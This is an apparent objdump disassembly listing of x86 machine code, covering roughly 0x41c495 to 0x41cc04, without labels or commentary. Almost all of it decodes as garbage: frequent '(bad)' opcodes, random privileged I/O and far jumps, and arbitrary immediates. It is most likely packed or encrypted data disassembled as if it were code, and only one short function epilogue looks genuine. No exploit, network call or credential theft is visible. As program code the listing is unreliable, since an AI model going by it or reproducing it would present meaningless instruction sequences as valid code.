  41c495:	(bad)  
  41c496:	mov    ds:0x77b8aac2,eax
  41c49b:	jmp    0x41c4e9
  41c49d:	ret    0x53f7
  41c4a0:	mov    ebx,0xfff36696
  41c4a5:	ror    BYTE PTR [edx+0x24],0x3f
  41c4a9:	pop    esi
  41c4aa:	lds    ecx,FWORD PTR [edi-0x1c]
  41c4ad:	push   ds
  41c4ae:	pushf  
  41c4af:	push   esi
  41c4b0:	(bad)  
  41c4b1:	adc    DWORD PTR [ebp-0x3f7386da],edx
  41c4b7:	dec    ecx
  41c4b8:	in     eax,dx
  41c4b9:	jne    0x41c475
  41c4bb:	mov    ebx,0x6a419052
  41c4c0:	and    al,0xde
  41c4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4c3:	adc    al,0xda
  41c4c5:	rcr    BYTE PTR [eax-0x3711cd2c],0x2a
  41c4cc:	imul   BYTE PTR [edx+0x519a2e01]
  41c4d2:	mov    ecx,edx
  41c4d4:	std    
  41c4d5:	mov    WORD PTR [esi],gs
  41c4d7:	inc    esi
  41c4d8:	ja     0x41c4cd
  41c4da:	mov    ebx,0xbd1a5d4a
  41c4df:	cmp    bl,BYTE PTR [eax+0x78dc8831]
  41c4e5:	push   cs
  41c4e6:	sti    
  41c4e7:	cmp    esi,DWORD PTR [esi+0x31]
  41c4ea:	sbb    BYTE PTR [esi-0x8],bh
  41c4ed:	pop    es
  41c4ee:	into   
  41c4ef:	je     0x41c508
  41c4f1:	cld    
  41c4f2:	cmp    BYTE PTR [ebp-0x6],0xc0
  41c4f6:	xor    ecx,DWORD PTR [edx+edx*8+0x48009f24]
  41c4fd:	dec    esp
  41c4fe:	and    al,0xc
  41c500:	sbb    al,0xe0
  41c502:	xor    DWORD PTR [edi+ebx*8+0x24],ebx
  41c506:	dec    esp
  41c507:	mov    ds:0x427d33ef,al
  41c50c:	inc    esi
  41c50d:	lods   al,BYTE PTR ds:[esi]
  41c50e:	shl    BYTE PTR [edx+0x1932ce0d],1
  41c514:	jnp    0x41c4b9
  41c516:	mov    ebx,0xed9a2175
  41c51b:	push   ebx
  41c51c:	nop
  41c51d:	push   esi
  41c51e:	rcl    DWORD PTR [eax+eax*2],1
  41c521:	jl     0x41c588
  41c523:	loop   0x41c4b6
  41c525:	inc    edx
  41c526:	pop    esp
  41c527:	jo     0x41c558
  41c529:	addr16 imul esp,ecx,0x45
  41c52d:	xor    eax,0x5f36a1c6
  41c532:	(bad)  
  41c533:	mov    gs,WORD PTR [edi-0x10]
  41c536:	mov    ecx,0x5ca5d9b6
  41c53b:	and    bl,bh
  41c53d:	push   ss
  41c53e:	cmp    eax,0x5cd8823f
  41c543:	pop    ss
  41c544:	pop    ss
  41c545:	daa    
  41c546:	pop    edi
  41c547:	sbb    al,0x16
  41c54a:	mov    al,ds:0xe90b97df
  41c54f:	(bad)  
  41c550:	(bad)  
  41c551:	xlat   BYTE PTR ds:[ebx]
  41c552:	inc    ecx
  41c553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c554:	in     eax,dx
  41c555:	nop
  41c556:	fsubr  DWORD PTR [esi+0x4dfb9150]
  41c55c:	xor    BYTE PTR [esi],ch
  41c55e:	leave  
  41c55f:	imul   esp,DWORD PTR [ebx],0x7cc528c4
  41c565:	mov    bh,0x5d
  41c567:	mov    dh,0x90
  41c569:	jl     0x41c4ef
  41c56b:	adc    eax,0x2728fe59
  41c570:	inc    edx
  41c571:	xchg   esp,eax
  41c572:	iret   
  41c573:	pop    ebp
  41c574:	sbb    esp,DWORD PTR [eax]
  41c576:	lahf   
  41c577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c578:	stc    
  41c579:	es dec edi
  41c57b:	vmulss xmm5,xmm0,DWORD PTR [ecx]
  41c57f:	inc    edx
  41c580:	push   cs
  41c581:	sub    eax,0x732b80f4
  41c586:	nop
  41c587:	mov    al,0xa3
  41c589:	cld    
  41c58a:	dec    ecx
  41c58b:	or     ch,BYTE PTR [edi]
  41c58d:	repz push ebx
  41c58f:	add    BYTE PTR [ebp+0x5a18a261],bl
  41c595:	mov    ecx,0x344cb06f
  41c59a:	mov    ebx,0x96a26821
  41c59f:	out    0x49,eax
  41c5a1:	xor    al,0xff
  41c5a3:	sbb    BYTE PTR [edx+ebp*2],ch
  41c5a6:	jmp    0x3e5d:0x7c01c6b2
  41c5ad:	inc    ebp
  41c5ae:	aaa    
  41c5af:	icebp  
  41c5b0:	dec    edi
  41c5b1:	leave  
  41c5b2:	fmul   DWORD PTR [esi+0x34ef2b26]
  41c5b8:	fsub   DWORD PTR [eax]
  41c5ba:	fwait
  41c5bb:	test   eax,0x8d8596ff
  41c5c0:	popf   
  41c5c1:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41c5c3:	mov    cl,0x86
  41c5c5:	jmp    0x1fdb:0xb189e51b
  41c5cc:	mov    fs,WORD PTR [eax]
  41c5ce:	loope  0x41c563
  41c5d0:	jne    0x41c55d
  41c5d2:	or     eax,0x16ec3a78
  41c5d7:	rcr    ebp,cl
  41c5d9:	and    eax,0x4109c08c
  41c5de:	mov    ebp,0x536b0d54
  41c5e3:	sbb    al,0x67
  41c5e5:	sbb    al,0x13
  41c5e7:	je     0x41c654
  41c5e9:	stos   BYTE PTR es:[edi],al
  41c5ea:	jae    0x41c629
  41c5ec:	mov    es,ecx
  41c5ee:	retf   0xc1d7
  41c5f1:	pop    ebx
  41c5f2:	in     al,0x2
  41c5f4:	sub    ch,BYTE PTR [esp+ebp*1-0x17]
  41c5f8:	stos   BYTE PTR es:[edi],al
  41c5f9:	pop    esi
  41c5fa:	sbb    ecx,DWORD PTR [esi]
  41c5fc:	push   esi
  41c5fd:	fistp  QWORD PTR [ebx+0x1a]
  41c600:	mov    ch,0x3b
  41c602:	add    DWORD PTR [eax-0x10],0x6027521a
  41c609:	dec    esi
  41c60a:	jae    0x41c644
  41c60c:	jge    0xbb916d5f
  41c612:	jns    0x41c5dd
  41c614:	push   ds
  41c615:	dec    edi
  41c616:	mov    esp,0x3ec771d2
  41c61c:	(bad)  
  41c61e:	mov    ebx,0x64635249
  41c623:	dec    edi
  41c624:	nop
  41c625:	repz sub esp,DWORD PTR [edx-0x4a]
  41c629:	adc    eax,0xa48a68ae
  41c62e:	xchg   edi,eax
  41c62f:	and    DWORD PTR [esi+0x3a],eax
  41c632:	fist   WORD PTR [edx-0x21]
  41c635:	adc    DWORD PTR [ebp+0x5e866e2a],0xffffffc5
  41c63c:	or     esp,DWORD PTR [ecx+0x3ce0621e]
  41c642:	dec    ebx
  41c643:	inc    ebp
  41c644:	mov    al,ds:0x2fb5c475
  41c649:	cmp    BYTE PTR [eax+0x6a],cl
  41c64c:	mov    edx,0x6664dcc1
  41c651:	pushf  
  41c652:	fistp  DWORD PTR [eax]
  41c654:	dec    eax
  41c655:	sub    al,BYTE PTR [eax-0x7f086227]
  41c65b:	add    ecx,ecx
  41c65d:	mov    ds:0x1129860d,eax
  41c662:	stc    
  41c663:	mov    esp,0x1baf7ba1
  41c668:	hlt    
  41c669:	and    bh,BYTE PTR [ecx+0xd]
  41c66c:	shr    DWORD PTR [esi],1
  41c66e:	pop    esp
  41c66f:	sti    
  41c670:	add    DWORD PTR [esi],edi
  41c672:	fcom   DWORD PTR [ecx+0x69]
  41c675:	mov    edi,0xa72c9a91
  41c67a:	arpl   WORD PTR [eax+0x7a],ax
  41c67d:	cmp    ch,BYTE PTR [esi-0x6e305182]
  41c683:	enter  0x17f8,0xa9
  41c687:	inc    esi
  41c688:	or     DWORD PTR [edx+0x3b],esi
  41c68b:	jno    0x41c65b
  41c68d:	pop    ecx
  41c68e:	jmp    0x41c68f
  41c690:	sub    DWORD PTR [edx-0x3da054dd],ebp
  41c696:	call   0xcb7b:0x7435ea5b
  41c69d:	xchg   ebp,eax
  41c69e:	sbb    al,BYTE PTR [esi-0x24ef8b59]
  41c6a4:	dec    ebp
  41c6a5:	mov    ebx,0x8936e362
  41c6aa:	rcl    BYTE PTR [edx-0x17],1
  41c6ad:	mov    ch,0x18
  41c6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6b0:	and    al,0xcd
  41c6b2:	arpl   WORD PTR [edx-0x78ca68],ax
  41c6b8:	pop    es
  41c6b9:	push   edx
  41c6ba:	aam    0x3d
  41c6bc:	add    dh,BYTE PTR [ebx]
  41c6be:	pop    ebx
  41c6bf:	je     0x41c6f0
  41c6c1:	mov    ch,0x5f
  41c6c3:	adc    BYTE PTR [edx+0x40],ch
  41c6c6:	pusha  
  41c6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c8:	push   edi
  41c6c9:	jo     0x41c73c
  41c6cb:	sar    DWORD PTR [edx-0x33a6e640],cl
  41c6d1:	pop    eax
  41c6d2:	xchg   BYTE PTR [eax+0x258f0772],dl
  41c6d8:	mov    esp,0x336a7674
  41c6dd:	add    eax,0x579410a8
  41c6e2:	ins    DWORD PTR es:[edi],dx
  41c6e3:	sti    
  41c6e4:	lock imul edx,eax,0xe3e6945d
  41c6eb:	std    
  41c6ec:	call   0xfb7b:0x31746259
  41c6f3:	arpl   WORD PTR [ecx+0x6e],di
  41c6f6:	mov    ecx,edx
  41c6f8:	popf   
  41c6f9:	fdiv   DWORD PTR [ecx-0x29]
  41c6fc:	or     BYTE PTR [eax-0x50],bh
  41c6ff:	pop    edx
  41c700:	mov    bl,BYTE PTR [ecx]
  41c702:	push   cs
  41c703:	(bad)  [esi+0x1eb9ad3a]
  41c709:	cwde   
  41c70a:	or     edx,DWORD PTR [esi-0x75]
  41c70d:	pop    ecx
  41c70e:	or     dl,ah
  41c710:	pop    edi
  41c711:	rep ins BYTE PTR es:[edi],dx
  41c713:	jae    0x41c6b1
  41c715:	pusha  
  41c716:	cwde   
  41c717:	sub    eax,0x1b7dfe95
  41c71c:	outs   dx,DWORD PTR ds:[esi]
  41c71d:	or     edi,DWORD PTR [edi-0x7c]
  41c720:	pusha  
  41c721:	cs dec edi
  41c723:	in     eax,0x2b
  41c725:	les    eax,FWORD PTR [ebp+0x2337647b]
  41c72b:	sub    eax,0x4275919e
  41c730:	or     eax,0xf9d0d429
  41c735:	xchg   ebx,eax
  41c736:	daa    
  41c737:	cmp    BYTE PTR [edi+0x32d5c1fe],ch
  41c73d:	cdq    
  41c73e:	enter  0x9cee,0xba
  41c742:	jmp    0x41c77c
  41c744:	xchg   edx,eax
  41c745:	out    dx,al
  41c746:	push   eax
  41c747:	jmp    0x4d9b:0xff47076c
  41c74e:	inc    ecx
  41c74f:	jo     0x41c7b0
  41c751:	inc    edi
  41c752:	test   eax,0xb73e72cb
  41c757:	aas    
  41c758:	imul   edi,DWORD PTR [ebx+edx*2],0xd
  41c75c:	mov    ecx,0x46986eaf
  41c761:	dec    ebp
  41c762:	jns    0x41c7cc
  41c764:	das    
  41c765:	add    al,0xda
  41c767:	jnp    0x41c7c7
  41c769:	sbb    eax,0x80b4c116
  41c76e:	outs   dx,DWORD PTR ds:[esi]
  41c76f:	jno    0x41c7d8
  41c771:	in     eax,0x72
  41c773:	(bad)  
  41c774:	mov    cl,0xbb
  41c776:	and    eax,0xf949e98e
  41c77b:	loopne 0x41c72b
  41c77d:	gs in  al,0x1c
  41c780:	mov    eax,0x8bf6de3f
  41c785:	push   0xffffff92
  41c787:	add    BYTE PTR [esi-0x4d92ba6e],bh
  41c78d:	pop    ebx
  41c78e:	mov    dl,0xd4
  41c790:	loop   0x41c7ef
  41c792:	xor    DWORD PTR [eax],edi
  41c794:	sahf   
  41c795:	fmul   QWORD PTR [esi]
  41c797:	scas   al,BYTE PTR es:[edi]
  41c798:	push   edi
  41c799:	mov    edi,DWORD PTR [eax-0x1320a12f]
  41c79f:	call   0xcc528dba
  41c7a4:	mov    dl,0xd6
  41c7a6:	in     al,dx
  41c7a7:	push   ecx
  41c7a8:	scas   al,BYTE PTR es:[edi]
  41c7a9:	mov    bl,0xbb
  41c7ab:	std    
  41c7ac:	jne    0x41c73c
  41c7ae:	mov    bh,0xe4
  41c7b0:	jecxz  0x41c7c2
  41c7b2:	imul   edi,DWORD PTR [ecx],0x72
  41c7b5:	jge    0x41c791
  41c7b7:	push   ss
  41c7b8:	push   edx
  41c7b9:	sbb    esp,0x3e
  41c7bc:	and    eax,0xca0d0b28
  41c7c1:	cs mov dl,0x94
  41c7c4:	jno    0x41c761
  41c7c6:	rol    DWORD PTR [edx+0x2c],1
  41c7c9:	xor    al,0xf
  41c7cb:	fistp  DWORD PTR [edx-0x48]
  41c7ce:	ret    
  41c7cf:	rcr    BYTE PTR [eax-0x2c50e2e6],0x34
  41c7d6:	pop    ss
  41c7d7:	cld    
  41c7d8:	js     0x41c84f
  41c7da:	ja     0x41c7a6
  41c7dc:	jmp    0x4703:0xbf1d286b
  41c7e3:	adc    eax,0x88dd32ca
  41c7e8:	scas   eax,DWORD PTR es:[edi]
  41c7e9:	inc    ecx
  41c7ea:	arpl   WORD PTR [ecx-0x67],sp
  41c7ed:	xchg   ebx,eax
  41c7ee:	xor    BYTE PTR [ecx+0x2d],bh
  41c7f1:	jmp    0x149490bc
  41c7f6:	sbb    dl,BYTE PTR [eax+ebp*2+0x25]
  41c7fa:	cli    
  41c7fb:	rcr    edx,cl
  41c7fd:	pusha  
  41c7fe:	add    BYTE PTR [ebp+0x70],bh
  41c801:	sub    al,0x22
  41c803:	xchg   edi,eax
  41c804:	loop   0x41c7b3
  41c806:	and    bl,al
  41c808:	inc    esi
  41c809:	out    dx,eax
  41c80a:	mov    bh,0x81
  41c80c:	and    al,0xa9
  41c80e:	mov    al,ds:0x1ca31eb0
  41c813:	sbb    dh,ah
  41c815:	push   esi
  41c816:	rol    edx,1
  41c818:	hlt    
  41c819:	ins    BYTE PTR es:[edi],dx
  41c81a:	cmp    ecx,DWORD PTR [esi+edi*2]
  41c81d:	sub    ebp,esi
  41c81f:	xchg   DWORD PTR [ecx],esp
  41c821:	call   0x18f2bca
  41c826:	test   eax,0x484ab56a
  41c82b:	(bad)  
  41c82c:	push   edx
  41c82d:	pop    esp
  41c82e:	xchg   ebx,eax
  41c82f:	daa    
  41c830:	stos   DWORD PTR es:[edi],eax
  41c831:	aas    
  41c832:	inc    esi
  41c833:	retf   0x6a9
  41c836:	mov    dl,0xb1
  41c838:	sub    al,BYTE PTR [ebx-0x15]
  41c83b:	ffree  st(7)
  41c83d:	ss aad 0xb9
  41c840:	and    al,0x5d
  41c842:	fidivr WORD PTR [ebx]
  41c844:	(bad)  
  41c845:	enter  0x75b2,0xba
  41c849:	pop    ecx
  41c84a:	lock mov eax,ds:0xbe01faf4
  41c850:	ins    BYTE PTR es:[edi],dx
  41c851:	add    eax,DWORD PTR [eax+0x7b]
  41c854:	dec    edi
  41c855:	xor    ebx,0xffffffc7
  41c858:	sbb    BYTE PTR [esi],ah
  41c85a:	inc    eax
  41c85b:	ins    BYTE PTR es:[edi],dx
  41c85c:	(bad)  
  41c85e:	pop    ds
  41c85f:	or     al,0xda
  41c861:	mov    cl,0x43
  41c863:	out    0x3,al
  41c865:	dec    ecx
  41c866:	shl    edi,0x9
  41c869:	das    
  41c86a:	and    eax,edi
  41c86c:	add    DWORD PTR [ebp-0x4d],edx
  41c86f:	lods   eax,DWORD PTR gs:[esi]
  41c871:	popf   
  41c872:	mov    DWORD PTR [ebp+ebp*8+0x11],ecx
  41c876:	add    ecx,DWORD PTR [edx]
  41c878:	sbb    ch,ch
  41c87a:	inc    ebp
  41c87b:	inc    eax
  41c87c:	xor    cl,BYTE PTR [ebp-0x1]
  41c87f:	sar    DWORD PTR [ecx],0x83
  41c882:	rcr    DWORD PTR [esi],0xdb
  41c885:	mov    ebp,0xf2c65de5
  41c88a:	mov    edx,0x1d886fe2
  41c88f:	or     DWORD PTR [esi-0x47],ebp
  41c892:	add    ebp,DWORD PTR [eax-0x6c]
  41c895:	sub    DWORD PTR [ecx+0x59],esi
  41c898:	push   esi
  41c899:	mov    ecx,DWORD PTR [edx]
  41c89b:	fld    DWORD PTR [eax+edi*1]
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xa3ba88e2
  41c8c2:	adc    al,0xcd
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [ebp+0x52000000],ch
  41c8cd:	sub    ebp,DWORD PTR [esi+0x31]
  41c8d0:	jmp    0x780a:0x891a491a
  41c8d7:	adc    eax,0x7a263bd0
  41c8dc:	mov    es,WORD PTR ds:0x96859577
  41c8e2:	jnp    0x41c8cc
  41c8e4:	dec    eax
  41c8e5:	push   ds
  41c8e6:	dec    ebx
  41c8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e8:	adc    eax,0x8b02c479
  41c8ed:	in     al,dx
  41c8ee:	aas    
  41c8ef:	dec    edi
  41c8f0:	jae    0x41c8fb
  41c8f2:	sbb    BYTE PTR [ebx-0x38],ah
  41c8f5:	rcr    DWORD PTR [ebx],cl
  41c8f7:	loopne 0x41c8ab
  41c8f9:	addr16 mov ah,0xa4
  41c8fc:	mov    bh,BYTE PTR [eax]
  41c8fe:	ja     0x41c945
  41c900:	sub    cl,BYTE PTR [edx-0x681c15fd]
  41c906:	push   edi
  41c907:	mov    ds:0xa9c55006,eax
  41c90c:	pop    ds
  41c90d:	jb     0x41c8ab
  41c90f:	cmp    DWORD PTR [esi],ebp
  41c911:	mov    esp,0xdc021062
  41c916:	lea    edi,ss:[ebp+ebx*2-0x472593c0]
  41c91e:	enter  0xd2aa,0x4e
  41c922:	dec    esp
  41c923:	pop    edx
  41c924:	adc    BYTE PTR [eax-0x3f9a85f2],0xab
  41c92b:	cmp    BYTE PTR [edx+esi*2+0x3a914a15],dh
  41c932:	hlt    
  41c933:	(bad)  
  41c934:	pushf  
  41c935:	adc    dl,BYTE PTR [edi]
  41c937:	push   esp
  41c938:	pusha  
  41c939:	fcomp  DWORD PTR [edx-0x11537171]
  41c93f:	daa    
  41c940:	lock jae 0x41c8ca
  41c943:	dec    esp
  41c944:	es jb  0x41c977
  41c947:	mov    ds:0x47a787b,al
  41c94c:	pusha  
  41c94d:	adc    DWORD PTR ds:0x5962ef6f,eax
  41c953:	fistp  QWORD PTR [ebx-0x54]
  41c956:	std    
  41c957:	cmp    edx,DWORD PTR ds:0x341861a7
  41c95d:	inc    eax
  41c95e:	mov    dl,0xf6
  41c960:	push   ebp
  41c961:	jle    0x41c97a
  41c963:	cld    
  41c964:	add    al,0x37
  41c966:	mov    al,0xeb
  41c968:	(bad)  
  41c969:	xchg   ebp,eax
  41c96a:	add    DWORD PTR [esi+edx*1+0x1f],ebp
  41c96e:	les    ebx,FWORD PTR [edi+0x4a]
  41c971:	xor    esp,esp
  41c973:	imul   edi,DWORD PTR [esi+0x66452e3e],0x0
	...
  41c982:	add    BYTE PTR [eax],al
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x2953f1e0
  41c994:	pop    esp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebp+0x30000000],ch
  41c99d:	inc    edx
  41c99e:	add    edi,DWORD PTR [esi]
  41c9a0:	fwait
  41c9a1:	nop
  41c9a2:	and    DWORD PTR [edx-0x4c],esp
  41c9a5:	adc    DWORD PTR [eax-0x1e],0xffffffcf
  41c9a9:	adc    eax,0x384bae51
  41c9ae:	xchg   esi,eax
  41c9af:	retf   0xeddd
  41c9b2:	jl     0x41c952
  41c9b4:	pop    esi
  41c9b5:	daa    
  41c9b6:	and    BYTE PTR [esi],0x36
  41c9b9:	sahf   
  41c9ba:	fs jmp 0x2a1118ba
  41c9c0:	mov    ebp,0x2ff5cb51
  41c9c5:	jnp    0x41c9d6
  41c9c7:	xchg   esp,eax
  41c9c8:	bound  eax,QWORD PTR ds:0xbed6c66
  41c9ce:	scas   eax,DWORD PTR es:[edi]
  41c9cf:	cli    
  41c9d0:	out    dx,al
  41c9d1:	jecxz  0x41ca3a
  41c9d3:	(bad)  
  41c9d4:	in     al,0xe5
  41c9d6:	pop    es
  41c9d7:	int3   
  41c9d8:	mov    edx,0xa9b347a8
  41c9dd:	push   0x4b32247c
  41c9e2:	cwde   
  41c9e3:	lods   eax,DWORD PTR ds:[esi]
  41c9e4:	adc    al,0x27
  41c9e6:	inc    ebx
  41c9e7:	daa    
  41c9e8:	add    edx,0xffffffcf
  41c9eb:	xchg   edi,eax
  41c9ec:	in     eax,0x78
  41c9ee:	ret    0xe537
  41c9f1:	jmp    0xe6f2:0x57aa7f59
  41c9f8:	fnstsw WORD PTR [edx+ebp*8]
  41c9fb:	push   0x654c5f13
  41ca00:	push   0x2614171e
  41ca05:	in     al,0xe8
  41ca07:	xchg   esi,eax
  41ca08:	push   ds
  41ca09:	scas   al,BYTE PTR es:[edi]
  41ca0a:	jno    0x41c9be
  41ca0c:	mov    ebp,0x760b1c94
  41ca11:	sahf   
  41ca12:	sub    BYTE PTR [esi-0x604061f4],ch
  41ca18:	jl     0x41ca4c
  41ca1a:	mov    esp,0x78a3023e
  41ca1f:	scas   eax,DWORD PTR es:[edi]
  41ca20:	(bad)  
  41ca21:	sub    dh,BYTE PTR ss:0x91db71d5
  41ca28:	adc    BYTE PTR [ebx-0x5b],ah
  41ca2b:	xor    ebx,DWORD PTR [ebx]
  41ca2d:	mov    bl,0x8f
  41ca2f:	xor    BYTE PTR [ebx],al
  41ca31:	cmp    edx,edi
  41ca33:	fimul  WORD PTR [ebx+0x14]
  41ca36:	fdivr  QWORD PTR [edx]
  41ca38:	fcom   QWORD PTR [ecx]
  41ca3a:	in     al,0x1c
  41ca3c:	mov    edx,0xa8b04999
  41ca41:	add    DWORD PTR [eax],ebx
  41ca43:	inc    BYTE PTR [edi-0x6621711c]
	...
  41ca51:	add    BYTE PTR [eax],al
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x8b8f35c],0x9
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebp-0x38000000],ch
  41ca6d:	pop    eax
  41ca6e:	gs push edi
  41ca70:	ret    
  41ca71:	aad    0x9d
  41ca73:	xchg   ebp,eax
  41ca74:	(bad)  
  41ca75:	arpl   WORD PTR [edi-0x1e],bp
  41ca78:	sub    DWORD PTR [eax-0x6e0ebb0d],0xdf5b7cf7
  41ca82:	(bad)  
  41ca83:	popa   
  41ca84:	sahf   
  41ca85:	jnp    0x41cab0
  41ca87:	lea    esi,[ecx+esi*2+0x8396d7f]
  41ca8e:	iret   
  41ca8f:	fnstcw WORD PTR [ebp+0x1b533916]
  41ca95:	ror    al,1
  41ca97:	add    edx,DWORD PTR [esi+0x636fc738]
  41ca9d:	fadd   st(1),st
  41ca9f:	enter  0x793a,0xd2
  41caa3:	push   eax
  41caa4:	xchg   edx,eax
  41caa5:	inc    eax
  41caa6:	mov    dh,0x27
  41caa8:	hlt    
  41caa9:	clc    
  41caaa:	shr    DWORD PTR ds:0x826f1725,0xaf
  41cab1:	push   es
  41cab2:	icebp  
  41cab3:	pop    ebx
  41cab4:	adc    BYTE PTR [ebp+0x4],cl
  41cab7:	in     eax,dx
  41cab8:	mov    ah,BYTE PTR [ecx]
  41caba:	push   0x64006a84
  41cabf:	add    ah,BYTE PTR [eax+0x52]
  41cac2:	cld    
  41cac3:	popf   
  41cac4:	call   DWORD PTR ds:0xe527fd6d
  41caca:	ror    DWORD PTR [ecx],cl
  41cacc:	cwde   
  41cacd:	out    0xfe,eax
  41cacf:	adc    bl,BYTE PTR [ecx+0x16]
  41cad2:	pop    eax
  41cad3:	call   0x564b:0x8ea0cb0a
  41cada:	sub    BYTE PTR [esi-0x65],ch
  41cadd:	ja     0x41ca8d
  41cadf:	icebp  
  41cae0:	and    edi,DWORD PTR [ebx+0x7f]
  41cae3:	fwait
  41cae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cae5:	push   ebx
  41cae6:	cli    
  41cae7:	sti    
  41cae8:	das    
  41cae9:	jle    0x41cb1c
  41caeb:	pop    es
  41caec:	cmp    BYTE PTR [edx-0x43],0x5d
  41caf0:	stos   BYTE PTR es:[edi],al
  41caf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf2:	test   DWORD PTR [ebp-0x18],ebp
  41caf5:	cmp    al,0x5e
  41caf7:	stc    
  41caf8:	(bad)  
  41cafb:	adc    BYTE PTR [eax+0x4b],bl
  41cafe:	pop    ebx
  41caff:	dec    esp
  41cb00:	ins    BYTE PTR es:[edi],dx
  41cb01:	sti    
  41cb02:	mov    edi,0x3e8f9192
  41cb07:	sti    
  41cb08:	and    ah,al
  41cb0a:	adc    al,0x35
  41cb0c:	mov    esi,0xcfd9c9d5
  41cb11:	add    BYTE PTR [esi-0x47],dh
  41cb14:	iret   
  41cb15:	or     ecx,ecx
  41cb17:	in     eax,0xdb
	...
  41cb21:	add    BYTE PTR [eax],al
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb31:	icebp  
  41cb32:	fdiv   st(6),st
  41cb34:	mov    dh,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   eax,DWORD PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [eax-0x1c],al
  41cb3e:	mov    ah,0x8e
  41cb40:	xlat   BYTE PTR ds:[ebx]
  41cb41:	xchg   ebp,edx
  41cb43:	int    0x5b
  41cb45:	cmc    
  41cb46:	call   0xabc65f9f
  41cb4b:	outs   dx,DWORD PTR ds:[esi]
  41cb4c:	xchg   esp,eax
  41cb4d:	ins    DWORD PTR es:[edi],dx
  41cb4e:	sub    BYTE PTR [eax+0x489e7153],0xda
  41cb55:	mov    al,ds:0x20a61d9b
  41cb5a:	(bad)  
  41cb5b:	sbb    eax,0x53eb1a04
  41cb60:	retf   
  41cb61:	xor    bh,BYTE PTR [bp+0x1df8]
  41cb66:	dec    edx
  41cb67:	pop    esp
  41cb68:	fdiv   QWORD PTR [edx+eiz*4]
  41cb6b:	inc    ebp
  41cb6c:	and    DWORD PTR [esi],ebx
  41cb6e:	pop    edi
  41cb6f:	pop    ebp
  41cb70:	fdivr  DWORD PTR [esi-0x70]
  41cb73:	jne    0x41cbcf
  41cb75:	xchg   ebp,eax
  41cb76:	mov    eax,0xe0d1380d
  41cb7b:	mov    dl,0xc6
  41cb7d:	or     al,0x43
  41cb7f:	xor    BYTE PTR [eax-0x3],al
  41cb82:	test   al,0x21
  41cb84:	xor    dh,BYTE PTR [eax]
  41cb86:	sbb    BYTE PTR [eax],0xba
  41cb89:	imul   DWORD PTR [edi+0x3e984900]
  41cb8f:	push   esp
  41cb90:	pop    es
  41cb91:	call   0xd0b5d8d7
  41cb96:	ror    ebx,0xf0
  41cb99:	div    BYTE PTR [eax]
  41cb9b:	push   cs
  41cb9c:	inc    ebp
  41cb9d:	fiadd  DWORD PTR [eax+0x347cc54b]
  41cba3:	xchg   edi,eax
  41cba4:	je     0x41cc0b
  41cba6:	push   ecx
  41cba7:	mov    esp,0xc2a3958b
  41cbac:	adc    ebp,DWORD PTR [ecx+0x79]
  41cbaf:	popf   
  41cbb0:	stos   DWORD PTR es:[edi],eax
  41cbb1:	idiv   eax
  41cbb3:	jl     0x41cc1b
  41cbb5:	push   cs
  41cbb6:	pop    edx
  41cbb7:	(bad)  
  41cbb8:	ror    edx,0xfc
  41cbbb:	push   eax
  41cbbc:	pusha  
  41cbbd:	mov    al,0x78
  41cbbf:	hlt    
  41cbc0:	dec    edx
  41cbc1:	pop    edi
  41cbc2:	fist   WORD PTR [eax-0x4ba38e2d]
  41cbc8:	les    eax,FWORD PTR [ecx+ebx*1+0x2109ad8]
  41cbcf:	dec    esi
  41cbd0:	push   ecx
  41cbd1:	retf   0xeac7
  41cbd4:	adc    eax,0xf56de34c
  41cbd9:	retf   
  41cbda:	jge    0x41cbac
  41cbdc:	loop   0x41cc14
  41cbde:	scas   al,BYTE PTR es:[edi]
  41cbdf:	es sub al,0xc1
  41cbe2:	or     eax,0xae7e2845
  41cbe7:	push   DWORD PTR [ebx+0x0]
  41cbed:	add    BYTE PTR [eax],al
  41cbef:	add    BYTE PTR [eax],al
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    dl,cl
  41cbf5:	mov    al,ds:0xdf7e4d76
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x90546437,al
  41cc04:	arpl   WORD PTR [eax+0xad0001],cx
